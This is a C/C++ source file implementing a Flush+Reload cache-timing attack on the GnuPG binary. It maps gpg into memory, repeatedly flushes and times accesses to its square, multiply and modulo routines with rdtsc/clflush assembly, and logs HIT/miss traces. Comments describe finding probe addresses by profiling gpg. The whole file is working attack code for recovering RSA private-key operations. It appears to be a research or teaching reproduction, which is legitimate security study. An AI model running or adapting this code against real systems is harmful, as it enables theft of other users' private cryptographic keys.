#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdint.h>
#include <vector>
using namespace std;

#include "constants.h"

// original flush+reload code from the paper

int probe(char *adrs) {
    volatile unsigned long time;

    asm __volatile__ (
        "   mfence \n "
        "   lfence \n "
        "   rdtsc \n "
        "   lfence \n "
        "   movl %%eax, %%esi \n "
        "   movl (%1), %%eax \n "
        "   lfence \n "
        "   rdtsc \n "
        "   subl %%esi, %%eax \n "
        "   clflush 0(%1) \n "
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    
    return time;
}

int main() {
    const char *filepath = "/usr/local/bin/gpg";
    
    int fd = open(filepath, O_RDONLY);
    // FILE* output = fopen("modulo_output.txt", "w");

    if (fd < 0) {
        printf("Error opening GPG binary");
        return 0;
    }

    struct stat st;
    fstat(fd, &st);

    char *gpg = (char *) mmap(NULL, st.st_size, PROT_READ, MAP_SHARED, fd, 0);
    
    if (gpg == MAP_FAILED) {
        printf("mmap failed");
        close(fd);
        return 0;
    }

    char *modulo = gpg + DIV;
    char *mul = gpg + MUL;
    char *sqr = gpg + SQR;
    int timeslot = 0;

    // recompile gpg, trace execution to find the functions it calls when performing a modular exponentiation, 
    // and then use that information to find the right place to probe
    
    // fix the sleep argument
    // find assembly instruction that performs an operation for a certain amount of cycles (probably noop - one cycle)
    // and then use a c function to call that instruction a certain number of times to create a delay of specified length
    // and make a busy wait loop that calls that function to create a delay of 0.625 seconds between each probe
    // recompile gpg with -pg to add profiling information and then use that information to find the
    // to find the functions its calling to hit them properly

    // you can also slow the gpg executable by putting sleeps in it if you want

    vector<pair<int, int>> modulo_probe_times;
    vector<pair<int, int>> mul_probe_times;
    vector<pair<int, int>> sqr_probe_times;

    while(timeslot < MAX_PROBES) {

        sqr_probe_times.push_back({timeslot, probe(sqr)});
        modulo_probe_times.push_back({timeslot, probe(modulo)});
        mul_probe_times.push_back({timeslot, probe(mul)});

        timeslot++;

        unsigned long time;
        asm volatile ("rdtsc\n"
              "shl $32, %%rdx\n"
              "or %%rdx, %%rax\n"
              : "=a"(time) : : "%rdx"); // gets the current time of cpu

        time += BUSY;

        unsigned long now;
        do {
            asm volatile ("rdtsc\n"
                      "shl $32, %%rdx\n"
                      "or %%rdx, %%rax\n"
                      : "=a"(now) : : "%rdx");
        } while (now < time); // waits until its been 2500 cycles

    }

    FILE* modulo_output = fopen("outputs/modulo_output.txt", "w");
    FILE* mul_output = fopen("outputs/mul_output.txt", "w");
    FILE* sqr_output = fopen("outputs/sqr_output.txt", "w");

    for (auto p : modulo_probe_times) {
        fprintf(modulo_output, "%d,mod,%d,%s\n", p.first, p.second, p.second < THRESHOLD ? "HIT" : "miss");
    }

    for (auto p : mul_probe_times) {
        fprintf(mul_output, "%d,mul,%d,%s\n", p.first, p.second, p.second < THRESHOLD ? "HIT" : "miss");
    }

    for (auto p : sqr_probe_times) {
        fprintf(sqr_output, "%d,sqr,%d,%s\n", p.first, p.second, p.second < THRESHOLD ? "HIT" : "miss");
    }

    fclose(modulo_output);
    fclose(mul_output);
    fclose(sqr_output);
}